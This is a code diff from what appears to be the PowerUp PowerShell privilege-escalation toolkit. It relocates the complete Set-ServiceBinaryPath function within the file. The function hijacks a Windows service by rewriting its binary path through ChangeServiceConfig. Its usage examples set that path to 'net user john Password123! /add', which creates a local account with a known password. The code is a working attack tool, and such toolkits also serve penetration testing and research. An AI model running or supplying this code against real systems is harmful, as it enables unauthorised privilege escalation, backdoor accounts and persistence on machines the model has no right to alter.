@@ -1708,123 +1708,7 @@ http://forum.sysinternals.com/tip-easy-way-to-enable-privileges_topic15745.html
 }
 
 
-function Set-ServiceBinaryPath {
-<#
-.SYNOPSIS
 
-Sets the binary path for a service to a specified value.
-
-Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation), Tobias Neitzel (@qtc_de)
-License: BSD 3-Clause
-Required Dependencies: PSReflect
-
-.DESCRIPTION
-
-Takes a service Name or a PowerUp.Service object on the pipeline and first opens up a
-service handle to the service with ConfigControl access using the GetServiceHandle
-Win32 API call. ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
-to the string value specified by binPath, and the handle is closed off.
-
-.PARAMETER Name
-
-An array of one or more service names to set the binary path for. Required.
-
-.PARAMETER Path
-
-The new binary path (lpBinaryPathName) to set for the specified service. Required.
-
-.EXAMPLE
-
-Set-ServiceBinaryPath -Name VulnSvc -Path 'net user john Password123! /add'
-
-Sets the binary path for 'VulnSvc' to be a command to add a user.
-
-.EXAMPLE
-
-Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /add'
-
-Sets the binary path for 'VulnSvc' to be a command to add a user.
-
-.LINK
-
-https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
-#>
-
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
-    [CmdletBinding()]
-    Param(
-        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [Alias('ServiceName')]
-        [String[]]
-        [ValidateNotNullOrEmpty()]
-        $Name,
-
-        [Parameter(Position=1, Mandatory = $True)]
-        [Alias('BinaryPath', 'binPath')]
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Path
-    )
-
-    BEGIN {
-        filter Local:Get-ServiceConfigControlHandle {
-            [OutputType([IntPtr])]
-            Param(
-                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
-                [ServiceProcess.ServiceController]
-                [ValidateNotNullOrEmpty()]
-                $TargetService
-            )
-            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
-            $ConfigControl = 0x00000002
-            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
-            $RawHandle
-        }
-
-        try {
-            $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
-            $Services = $GetServices.Invoke($null, $null)
-        } catch [System.InvalidOperationException] {
-            Write-Error "Service enumeration via ServiceController: Failed. [Access Denied]"
-            return $null
-        }
-
-    }
-
-    PROCESS {
-
-        ForEach($IndividualService in $Name) {
-
-            $TargetService = $Services | Where-Object { $_.Name -eq $IndividualService }
-            if( $TargetService -eq $null ) {
-                Write-Error "Specified service '$IndividualService' not found."
-            }
-
-            try {
-                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
-            }
-            catch {
-                $ServiceHandle = $Null
-                Write-Error "Error opening up the service handle with read control for $IndividualService : $_"
-            }
-
-            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
-
-                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
-                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-                if ($Result -ne 0) {
-                    Write-Host "[+] binPath for $IndividualService successfully set to '$Path'"
-                }
-                else {
-                    Write-Error ([ComponentModel.Win32Exception] $LastError)
-                }
-
-                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
-            }
-        }
-    }
-}
 
 
 function Test-ServiceDaclPermission {
@@ -2709,6 +2593,124 @@ Custom command to execute instead of user creation.
     $Out
 }
 
+
+function Set-ServiceBinaryPath {
+<#
+.SYNOPSIS
+
+Sets the binary path for a service to a specified value.
+
+Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation), Tobias Neitzel (@qtc_de)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
+
+.DESCRIPTION
+
+Takes a service Name or a PowerUp.Service object on the pipeline and first opens up a
+service handle to the service with ConfigControl access using the GetServiceHandle
+Win32 API call. ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
+to the string value specified by binPath, and the handle is closed off.
+
+.PARAMETER Name
+
+An array of one or more service names to set the binary path for. Required.
+
+.PARAMETER Path
+
+The new binary path (lpBinaryPathName) to set for the specified service. Required.
+
+.EXAMPLE
+
+Set-ServiceBinaryPath -Name VulnSvc -Path 'net user john Password123! /add'
+
+Sets the binary path for 'VulnSvc' to be a command to add a user.
+
+.EXAMPLE
+
+Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /add'
+
+Sets the binary path for 'VulnSvc' to be a command to add a user.
+
+.LINK
+
+https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
+#>
+
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('ServiceName')]
+        [String[]]
+        [ValidateNotNullOrEmpty()]
+        $Name,
+
+        [Parameter(Position=1, Mandatory = $True)]
+        [Alias('BinaryPath', 'binPath')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Path
+    )
+
+    BEGIN {
+        filter Local:Get-ServiceConfigControlHandle {
+            [OutputType([IntPtr])]
+            Param(
+                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
+                [ServiceProcess.ServiceController]
+                [ValidateNotNullOrEmpty()]
+                $TargetService
+            )
+            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
+            $ConfigControl = 0x00000002
+            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
+            $RawHandle
+        }
+
+        try {
+            $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
+            $Services = $GetServices.Invoke($null, $null)
+        } catch [System.InvalidOperationException] {
+            Write-Error "Service enumeration via ServiceController: Failed. [Access Denied]"
+            return $null
+        }
+
+    }
+
+    PROCESS {
+
+        ForEach($IndividualService in $Name) {
+
+            $TargetService = $Services | Where-Object { $_.Name -eq $IndividualService }
+            if( $TargetService -eq $null ) {
+                Write-Error "Specified service '$IndividualService' not found."
+            }
+
+            try {
+                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
+            }
+            catch {
+                $ServiceHandle = $Null
+                Write-Error "Error opening up the service handle with read control for $IndividualService : $_"
+            }
+
+            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
+
+                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
+                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+                if ($Result -ne 0) {
+                    Write-Host "[+] binPath for $IndividualService successfully set to '$Path'"
+                }
+                else {
+                    Write-Error ([ComponentModel.Win32Exception] $LastError)
+                }
+
+                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
+            }
+        }
+    }
+}
 
 ########################################################
 #
